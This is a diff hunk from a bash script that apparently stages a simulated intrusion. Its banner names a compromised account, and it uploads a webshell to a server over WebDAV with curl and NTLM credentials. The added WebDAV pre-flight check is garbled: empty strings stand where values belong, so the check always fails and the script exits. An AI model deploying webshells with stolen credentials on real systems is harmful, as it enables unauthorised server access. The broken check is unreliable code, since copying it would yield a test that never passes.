@@ -47,6 +47,16 @@ echo -e "${YELLOW}║  Account: j.chen (compromised)               ║${NC}"
 echo -e "${YELLOW}╚══════════════════════════════════════════════╝${NC}"
 echo ""
 
+
+# Pre-check: Verify WebDAV is accessible
+echo -e "[0/4] Pre-flight: checking WebDAV accessibility..."
+WEBDAV_CHECK="000""000"
+if [[ "" != "2"* && "" != "401" && "" != "403" ]]; then
+  echo -e "[FAIL] WebDAV not accessible (HTTP ). Check SP01 IIS WebDAV."
+  exit 1
+fi
+echo -e "  [OK] WebDAV accessible"
+
 # Step 1: Upload webshell via WebDAV
 echo -e "${YELLOW}[1/4] Uploading webshell via WebDAV...${NC}"
 HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --ntlm -u "$CREDS" \
